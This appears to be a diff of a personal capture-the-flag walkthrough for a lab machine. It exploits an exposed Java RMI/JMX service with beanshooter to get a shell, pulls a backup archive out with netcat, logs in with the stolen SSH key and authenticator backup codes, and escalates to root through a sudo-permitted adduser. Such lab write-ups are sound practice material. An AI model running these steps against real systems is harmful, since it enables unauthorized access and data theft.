@@ -1,0 +1,84 @@
+nmap -sV -sC -vv -oA nmap/manage ipaddress
+
+uses java rmi
+
+going to try and exploit with metasploit
+
+auxiliary/scanner/misc/java_rmi_server
+This only works if classloader is enabled
+
+we are going to use beanshooter github to attack the underlying jmx
+install maven
+sudo apt install maven
+
+so we go to the target directory in beanshooter
+
+
+run java -jar beanshooter-4.1.0-jar-with-dependencies.jar brute 10.129.166.96 2222 
+
+to try and break the username and password, but there is no username and password in this case 
+
+so we just do enum for vulnerabilities
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.166.96 2222 
+
+now we create a foothold
+
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar -h
+
+we use the standard option to create an mbean
+
+java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard ip address port tonka : tonka is general purpose read and write 
+
+to connect, use java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.166.96 2222
+
+cd /opt/tomcat
+cat user.txt
+
+to show users
+
+ls -la /home 
+
+to download a file/folder from the tomcat 
+
+we start a listener on our own machine using 
+
+nc -lvnp 9002 > filename
+
+on the tomcat machine 
+
+nc ip address port < filename
+
+once we have the file, we do a 
+
+tar -zxvf filename 
+
+we see a .ssh file and now we can do a ssh using the .ssh file
+
+ssh useradmin@ipaddress -i .ssh/filename, do not use the file.pub
+
+when we use the ssh, we have to then enter a google authentication code, 
+
+go back to the .ggogle_authentication and the codes work only 1 time
+
+after logged in, 
+
+we do sudo -l 
+
+and see that we can create add a user
+
+
+/usr/sbin/adduser ^[a-zA-Z0-9]+$
+
+sudo /usr/sbin/adduser admin
+
+change users to the new created user 
+
+su admin
+
+sudo su 
+
+enter newly created password 
+
+have root access
+
+
